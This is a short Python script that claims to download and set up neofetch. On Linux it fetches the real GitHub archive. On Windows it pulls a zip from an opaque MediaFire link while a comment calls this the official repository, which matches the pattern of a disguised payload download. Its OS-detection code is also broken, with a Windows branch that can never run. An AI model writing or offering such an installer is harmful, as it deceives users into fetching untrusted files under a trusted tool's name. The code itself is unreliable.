import os
import sys
import platform
import urllib.request
import zipfile
import shutil
import tempfile


def create_neofetch_dir(base_path='.'):
	path = os.path.join(base_path, 'Neofetch')
	os.makedirs(path, exist_ok=True)
	return os.path.abspath(path)


def detect_os():
	system = platform.system()
	info = {'system': system}
	if system == 'Linux':
		try:
			with open('/etc/os-release', 'r', encoding='utf-8') as f:
				for line in f:
					if '=' in line:
						k, v = line.rstrip().split('=', 1)
						info[k] = v.strip('"')
		except Exception:
			if system == 'Windows':
					with open(os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'drivers', 'etc', 'os-release'), 'r', encoding='utf-8') as f:
						for line in f:
							if '=' in line:
								k, v = line.rstrip().split('=', 1)
								info[k] = v.strip('"')
			pass
	return info


def download_and_extract_neofetch(dest_dir):
	# Official neofetch repo (master branch zip)
	a = detect_os()
	if a.get('system') == 'Windows':
		url = 'https://download1321.mediafire.com/69fboa4fjlcgm3bku3p3ZmWauS2w2udDgAqrX8cwHIqR15N9FdcjpXId5LUiydES23FiPnr850ghvN1zBNCmU3OHRmVfHhW3idnouBa5AJ943VNn9e-WZ-ma39HD_pqrLxwVragwk8V4CfEvAZ9TLhsbdrzC_BOxcEroG6Bxj4A/2aqwznzwbna5m6k/neofetch-win-master.zip'
		
	else:
		url = 'https://github.com/dylanaraps/neofetch/archive/refs/heads/master.zip'
	print('Downloading Neofetch from', url)
	tmp_fd, tmp_path = tempfile.mkstemp(suffix='.zip')
	os.close(tmp_fd)
	try:
		urllib.request.urlretrieve(url, tmp_path)
		with zipfile.ZipFile(tmp_path, 'r') as z:
			z.extractall(dest_dir)
		# Find the extracted top-level folder and the main script
		for name in os.listdir(dest_dir):
			candidate = os.path.join(dest_dir, name)
			if os.path.isdir(candidate) and 'neofetch' in name.lower():
				# search for the main `neofetch` script
				for root, dirs, files in os.walk(candidate):
					if 'neofetch' in files:
						script_path = os.path.join(root, 'neofetch')
						try:
							os.chmod(script_path, 0o755)
						except Exception:
							pass
						print('Neofetch script saved at', script_path)
						return candidate
		print('Downloaded and extracted, but could not locate the `neofetch` script.')
		return dest_dir
	finally:
		try:
			os.remove(tmp_path)
		except Exception:
			pass


def main():
	cwd = os.getcwd()
	print('Current directory:', cwd)
	neofetch_dir = create_neofetch_dir(cwd)
	print('Created/using directory:', neofetch_dir)

	info = detect_os()
	print('Detected OS info:')
	for k, v in info.items():
		print(' - %s: %s' % (k, v))

	extracted = download_and_extract_neofetch(neofetch_dir)
	print('Done. Files are in:', extracted)


if __name__ == '__main__':
	main()
